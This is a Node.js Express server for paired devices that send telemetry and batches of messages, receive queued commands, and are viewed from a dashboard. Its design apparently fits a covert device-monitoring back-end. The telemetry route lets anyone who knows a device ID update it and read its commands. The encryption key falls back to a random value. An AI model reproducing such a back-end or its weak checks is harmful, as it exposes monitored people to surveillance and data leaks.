import express from 'express'
import admin from 'firebase-admin'
import cors from 'cors'
import dotenv from 'dotenv'
import rateLimit from 'express-rate-limit'
import helmet from 'helmet'
import crypto from 'crypto'

dotenv.config()

const app = express()

// Security middleware
app.use(helmet())
app.use(cors({
 origin: process.env.ALLOWED_ORIGINS?.split(',') || ['https://dashboard.system-utility.cloud'],
 credentials: true,
 methods: ['GET', 'POST']
}))
app.use(express.json({ limit: '5mb' }))

// Firebase initialization
const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_JSON || '{}')
const databaseUrl = process.env.FIREBASE_DATABASE_URL

if (!serviceAccount.project_id || !databaseUrl) {
 console.error('Firebase configuration missing')
 process.exit(1)
}

admin.initializeApp({
 credential: admin.credential.cert(serviceAccount),
 databaseURL: databaseUrl
})

const db = admin.database()

// Encryption utilities
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex')
const ALGORITHM = 'aes-256-gcm'

const encrypt = (text) => {
 try {
 const iv = crypto.randomBytes(16)
 const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv)
 let encrypted = cipher.update(text, 'utf8', 'hex')
 encrypted += cipher.final('hex')
 const authTag = cipher.getAuthTag()
 return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted
 } catch (e) {
 console.error('Encryption error:', e.message)
 return null
 }
}

const decrypt = (text) => {
 try {
 const parts = text.split(':')
 if (parts.length !== 3) return null
 const iv = Buffer.from(parts[0], 'hex')
 const authTag = Buffer.from(parts[1], 'hex')
 const encrypted = parts[2]
 const decipher = crypto.createDecipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv)
 decipher.setAuthTag(authTag)
 let decrypted = decipher.update(encrypted, 'hex', 'utf8')
 decrypted += decipher.final('utf8')
 return decrypted
 } catch (e) {
 return null
 }
}

// Rate limiters
const telemetryLimiter = rateLimit({
 windowMs: 5 * 60 * 1000,
 max: 50,
 keyGenerator: (req) => req.deviceId || req.ip,
 skip: (req) => !req.deviceId,
 standardHeaders: false,
 legacyHeaders: false
})

const pairLimiter = rateLimit({
 windowMs: 15 * 60 * 1000,
 max: 5,
 keyGenerator: (req) => req.uid || req.ip,
 standardHeaders: false,
 legacyHeaders: false
})

// Validation
const sanitizeDeviceId = (id) => {
 if (!id || typeof id !== 'string') return null
 const clean = id.replace(/[^a-zA-Z0-9_-]/g, '').substring(0, 64)
 return clean.length > 0 ? clean : null
}

const sanitizeUserId = (id) => {
 if (!id || typeof id !== 'string') return null
 return id.substring(0, 128)
}

// Middleware
const verifyUser = async (req, res, next) => {
 try {
 const token = req.headers.authorization?.split('Bearer ')[1]
 if (!token) return res.status(401).json({ error: 'No token' })
 const decoded = await admin.auth().verifyIdToken(token)
 req.uid = decoded.uid
 next()
 } catch (e) {
 res.status(403).json({ error: 'Invalid token' })
 }
}

const validateDevice = async (req, res, next) => {
 const rawId = req.headers['x-device-id'] || req.body?.device_id
 const deviceId = sanitizeDeviceId(rawId)
 if (!deviceId) return res.status(401).json({ error: 'Invalid device ID' })
 try {
 const snap = await db.ref(`devices/${deviceId}`).once('value')
 if (!snap.exists()) return res.status(403).json({ error: 'Device not found' })
 const device = snap.val()
 if (!device.pairedTo) return res.status(403).json({ error: 'Device not paired' })
 req.deviceId = deviceId
 next()
 } catch (e) {
 console.error('validateDevice:', e.message)
 res.status(500).json({ error: 'Server error' })
 }
}

const validateDeviceLoose = async (req, res, next) => {
 const rawId = req.headers['x-device-id'] || req.body?.device_id
 const deviceId = sanitizeDeviceId(rawId)
 if (!deviceId) return res.status(401).json({ error: 'Invalid device ID' })
 req.deviceId = deviceId
 next()
}

// Routes
app.get('/', (req, res) => {
 res.json({ status: 'online', version: '3.1.0' })
})

app.post('/api/v2/telemetry', telemetryLimiter, validateDeviceLoose, async (req, res) => {
 try {
 const { device_id, timestamp, status, battery, interval } = req.body
 const deviceId = sanitizeDeviceId(device_id) || req.deviceId

 if (typeof battery !== 'number' || battery < 0 || battery > 100) {
 return res.status(400).json({ error: 'Invalid battery' })
 }
 if (typeof interval !== 'number' || interval < 30 || interval > 3600) {
 return res.status(400).json({ error: 'Invalid interval' })
 }

 await db.ref(`devices/${deviceId}`).update({
 lastSeen: timestamp || Date.now(),
 status: status || 'active',
 battery: battery,
 interval: interval,
 updatedAt: Date.now()
 })

 const commandsSnap = await db.ref(`devices/${deviceId}/commands`).orderByChild('timestamp').limitToLast(5).once('value')
 res.json({ success: true, commands: commandsSnap.val() || null })
 } catch (e) {
 console.error('telemetry:', e.message)
 res.status(500).json({ error: 'Internal error' })
 }
})

app.post('/api/v2/data', telemetryLimiter, validateDevice, async (req, res) => {
 try {
 const deviceId = req.deviceId
 const batch = req.body

 if (!batch || typeof batch !== 'object') {
 return res.status(400).json({ error: 'Invalid batch' })
 }

 const batchRef = db.ref(`devices/${deviceId}/raw_batches`)
 const encryptedBatch = {
 data: encrypt(JSON.stringify(batch)),
 receivedAt: Date.now()
 }
 await batchRef.push(encryptedBatch)

 await batchRef.transaction((currentData) => {
 if (!currentData) return currentData
 const keys = Object.keys(currentData)
 if (keys.length <= 100) return currentData
 keys.sort()
 const toDelete = keys.slice(0, keys.length - 100)
 const result = { ...currentData }
 toDelete.forEach(k => delete result[k])
 return result
 })

 res.json({ success: true, received: Array.isArray(batch.messages) ? batch.messages.length : 0 })
 } catch (e) {
 console.error('data:', e.message)
 res.status(500).json({ error: 'Internal error' })
 }
})

app.post('/api/v2/pair', verifyUser, pairLimiter, async (req, res) => {
 try {
 const { code } = req.body
 const userId = sanitizeUserId(req.uid)
 
 if (!code || typeof code !== 'string' || !/^\d{6}$/.test(code)) {
 return res.status(400).json({ error: 'Invalid pairing code' })
 }

 const snap = await db.ref('pairing_requests').once('value')
 const requests = snap.val() || {}
 const entry = Object.entries(requests).find(([_, v]) => v.pairing_code === code && Date.now() - v.timestamp < 300000)
 
 if (!entry) return res.status(404).json({ error: 'Invalid or expired code' })

 const [deviceId] = entry
 const existingSnap = await db.ref(`devices/${deviceId}/pairedTo`).once('value')
 if (existingSnap.exists()) {
 return res.status(409).json({ error: 'Device already paired' })
 }

 await db.ref(`users/${userId}/devices/${deviceId}`).set({
 pairedAt: Date.now()
 })
 await db.ref(`devices/${deviceId}/pairedTo`).set(userId)
 await db.ref(`devices/${deviceId}/pairing_code`).remove()
 await db.ref(`pairing_requests/${deviceId}`).remove()
 res.json({ success: true, deviceId })
 } catch (e) {
 console.error('pair:', e.message)
 res.status(500).json({ error: 'Internal error' })
 }
})

app.get('/api/v2/devices/:deviceId', verifyUser, async (req, res) => {
 try {
 const deviceId = sanitizeDeviceId(req.params.deviceId)
 if (!deviceId) return res.status(400).json({ error: 'Invalid device ID' })
 
 const access = await db.ref(`users/${req.uid}/devices/${deviceId}`).once('value')
 if (!access.exists()) return res.status(403).json({ error: 'No access' })
 
 const snap = await db.ref(`devices/${deviceId}`).once('value')
 if (!snap.exists()) return res.status(404).json({ error: 'Device not found' })
 
 res.json({ success: true, data: snap.val() })
 } catch (e) {
 console.error('devices:', e.message)
 res.status(500).json({ error: 'Internal error' })
 }
})

const PORT = process.env.PORT || 3000
app.listen(PORT, () => {
 console.log(`Server v3.1.0 listening on ${PORT}`)
})
